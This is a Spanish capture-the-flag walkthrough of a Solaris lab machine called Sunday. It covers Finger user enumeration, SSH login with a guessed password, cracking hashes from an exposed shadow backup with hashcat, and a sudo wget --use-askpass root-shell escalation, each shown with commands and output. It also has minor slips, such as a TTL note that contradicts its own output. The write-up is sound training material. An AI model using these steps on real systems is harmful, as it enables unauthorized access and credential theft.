# Sunday

![](../../../../~gitbook/image.md)Publicado: 13 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
###📝 Descripción
Sunday es una máquina basada en Oracle Solaris que pone a prueba tus habilidades de enumeración de servicios poco comunes como Finger. La escalada implica el descubrimiento de credenciales a través de archivos de backup y el abuso de privilegios sudo. La máquina requiere conocimientos sobre enumeración básica, crackeo de contraseñas y vectores de elevación de privilegios en entornos Unix.
###🚀 Metodología

###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos

####Enumeración de servicios

###🌐 Enumeración Web

####6787 HTTP (Apache )
Al al servicio de este puerto un mensaje nos indica que debemos hacerlo mediante https, así que somo redirigidos a:https://10.10.10.76:6787/solaris/login/![](../../../../~gitbook/image.md)Intentamos acceder con las credenciales por defecto jack:jack y root:solaris sin éxito.Poco más podemos hacer aquí de momento
####79 FINGER
Investigamos un poco sobre cómo enumerar este servicio y encontramos un script de pentestmonkey en perl:https://github.com/pentestmonkey/finger-user-enum/blob/master/finger-user-enum.plEste script permite enumerar usuarios pasando una lista como parámetroDescargamos el scriptEjecutamos el script usando la lista names de sectlistsObtenemos los siguientes resultados![](../../../../~gitbook/image.md)Podríamos usar fuerza bruta con hydra con cada uno de estos usuarios y el diccionaro rockyou contra el puerto ssh aunque primero podemos probar con algunas credenciales comunes como admin, root, sunday, Sunday, etc:Finalmente logramos iniciar sesión vía ssh en el puerto 22022 con `sunny:Sunday`Sin embargo la primera flag está en el usuario sammy y de momento no tenemos acceso:Verficamos posibles binarios que sunny pueda ejecutar como rootAunque no parece que vaya a llevarnos a buen puerto.Continuamos enumerando y damos con algo que podría ser interesante:Tenemos un archivo de backup del fichero shadow:Podemos intentar usar fuerza bruta con hydra y rockyou para intentar crackear el hash del usuario sammy:Usamos la herramineta name the hash para determinar qué tipo de hash es:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Obtenemos la contraseña del usuario `sammy:cooldude!` y nos autenticamos como este usuario en el host remoto:Ahora sí, obtenemos la primera flag:Ahora verificamos si sammy puede ejecutar algún binario como root:Buscamos información de este binario en GTfobins y lo usamos para escalar a root y obtener la flag:https://gtfobins.github.io/gtfobins/wget/#sudoLast updated 10 months ago- [📝 Descripción](#descripcion)
- [🚀 Metodología](#metodologia)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯ ping -c2 10.10.10.76
PING 10.10.10.76 (10.10.10.76) 56(84) bytes of data.
64 bytes from 10.10.10.76: icmp_seq=1 ttl=254 time=43.7 ms
64 bytes from 10.10.10.76: icmp_seq=2 ttl=254 time=43.1 ms

--- 10.10.10.76 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 43.121/43.421/43.721/0.300 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.76 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯  echo $ports
79,111,515,6787,22022
```

```
❯ nmap -sC -sV -p$ports 10.10.10.276 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 18:49 CEST
Nmap scan report for 10.10.10.76
Host is up (0.044s latency).

PORT      STATE SERVICE VERSION
79/tcp    open  finger?
| fingerprint-strings:
|   GenericLines:
|     No one logged on
|   GetRequest:
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions:
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help:
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest:
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie:
|_    Login Name TTY Idle When Where
|_finger: No one logged on\x0D
111/tcp   open  rpcbind 2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)

```

```
finger-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )
```

```
wget https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/refs/heads/master/finger-user-enum.pl
```

```
perl finger-user-enum.pl -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t 10.10.10.76
```

```
ssh sunny@10.10.10.76 -p22022
The authenticity of host '[10.10.10.76]:22022 ([10.10.10.76]:22022)' can't be established.
ED25519 key fingerprint is SHA256:t3OPHhtGi4xT7FTt3pgi5hSIsfljwBsZAUOPVy8QyXc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.10.76]:22022' (ED25519) to the list of known hosts.
The latest at Tue May 13 18:18 2025.
Last login: Wed Apr 13 15:35:50 2022 from 10.10.14.13
Oracle Solaris 11.4.42.111.0                  Assembled December 2021
sunny@sunday:~$
```

```
sunny@sunday:/home/sammy$ ls -la
total 10
drwxr-xr-x   2 root     root           4 May  6 07:36 .
dr-xr-xr-x   4 root     root           4 Dec 19  2021 ..
-rw-------   1 root     root         123 May  6 07:36 .bash_history
-rw-r-----   1 sammy    root          33 May 13 17:51 user.txt
sunny@sunday:/home/sammy$ cat user.txt
cat: cannot open user.txt: Permission denied
```

```
sunny@sunday:/var$ sudo -l
User sunny may run the following commands on sunday:
(root) NOPASSWD: /root/troll
```

```
sunny@sunday:/backup$ ls -la
total 28
drwxr-xr-x   2 root     root           4 Dec 19  2021 .
drwxr-xr-x  25 root     sys           28 May 13 17:50 ..
-rw-r--r--   1 root     root         319 Dec 19  2021 agent22.backup
-rw-r--r--   1 root     root         319 Dec 19  2021 shadow.backup
```

```
sunny@sunday:/backup$ cat shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

```
nth --text '$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB'
```

```
hashcat -m 7400 sammy_hash /usr/share/wordlists/rockyou.txt
```

```
sunny@sunday:/backup$ su sammy
Password:
Warning: 2 failed authentication attempts since last successful authentication.  The latest at Tue May 13 18:23 2025.
sammy@sunday:/backup$ whoami
sammy
```

```
sammy@sunday:/backup$ cd /home/sammy
sammy@sunday:/home/sammy$ ls -la
total 10
drwxr-xr-x   2 root     root           4 May  6 07:36 .
dr-xr-xr-x   4 root     root           4 Dec 19  2021 ..
-rw-------   1 root     root         123 May  6 07:36 .bash_history
-rw-r-----   1 sammy    root          33 May 13 17:51 user.txt
sammy@sunday:/home/sammy$ cat user.txt
```

```
sammy@sunday:/home/sammy$ sudo -l
User sammy may run the following commands on sunday:
(root) NOPASSWD: /usr/bin/wget
```

```
sammy@sunday:/home/sammy$ TF=$(mktemp)
sammy@sunday:/home/sammy$ chmod +x $TF
sammy@sunday:/home/sammy$ echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sammy@sunday:/home/sammy$ sudo wget --use-askpass=$TF 0
root@sunday:/home/sammy# id
uid=0(root) gid=0(root)
root@sunday:/home/sammy# cd /root
root@sunday:~# cat root.txt
ed5c3*********************
root@sunday:~#
```
